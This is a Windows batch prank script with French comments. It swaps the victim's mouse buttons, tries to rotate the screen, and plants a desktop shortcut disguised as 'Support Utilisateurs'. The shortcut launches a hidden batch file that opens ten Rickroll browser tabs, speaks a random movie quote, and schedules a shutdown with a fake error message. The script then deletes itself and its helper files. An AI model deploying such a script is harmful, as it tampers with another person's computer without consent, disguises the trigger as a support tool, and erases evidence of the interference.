@echo off
:: Also, simply Shift + Alt + Printscreen

echo cscript /nologo %APPDATA%\RandQuote.vbs > %APPDATA%\rickroll.bat
echo shutdown /s /t 1925000 /c "Erreur 42: interface chaise-machine défectueuse" >> %APPDATA%\rickroll.bat
for /l %%x in (1, 1, 10) do echo start "RickRoll" "https://www.youtube.com/watch?v=dQw4w9WgXcQ" >> %APPDATA%\rickroll.bat
echo del "%HOMEDRIVE%%HOMEPATH%\Desktop\Support Utilisateurs.lnk" >> %APPDATA%\rickroll.bat
echo del "%APPDATA%\RandQuote.vbs" >> %APPDATA%\rickroll.bat
echo del "%APPDATA%\rickroll.bat" >> %APPDATA%\rickroll.bat

> %APPDATA%\CreateShortcutToRickRollAndInvertScreen.vbs (
    @echo Set oWS = WScript.CreateObject^("WScript.Shell"^)
    @echo sLinkFile = oWS.ExpandEnvironmentStrings^("%HOMEDRIVE%%HOMEPATH%\Desktop\Support Utilisateurs.lnk"^)
    @echo Set oLink = oWS.CreateShortcut^(sLinkFile^)
    @echo oLink.TargetPath = oWS.ExpandEnvironmentStrings^("%APPDATA%\rickroll.bat"^)
    @echo oLink.IconLocation = "%SystemRoot%\System32\imageres.dll,3"
    @echo oLink.Save
    @echo oWS.SendKeys "^%%{DOWN}"
)
cscript /nologo %APPDATA%\CreateShortcutToRickRollAndInvertScreen.vbs
del %APPDATA%\CreateShortcutToRickRollAndInvertScreen.vbs
> %APPDATA%\RandQuote.vbs (
    @echo quotes = Array^("Houston, we have a problem", "It's alive ! It's alive !", "May the force be with you", "You talkin' to me ?", "I'll be back", "Elementary, my dear Watson", "Hasta la vista, baby", "There is no place like 127.0.0.1"^)
    @echo randomize
    @echo CreateObject^("SAPI.SpVoice"^).speak^(quotes^(int^(rnd * UBound^(quotes^)^)^)^)
)

RUNDLL32 USER32.DLL,SwapMouseButton

:: nevermind the "The batch file cannot be found." msg
del %0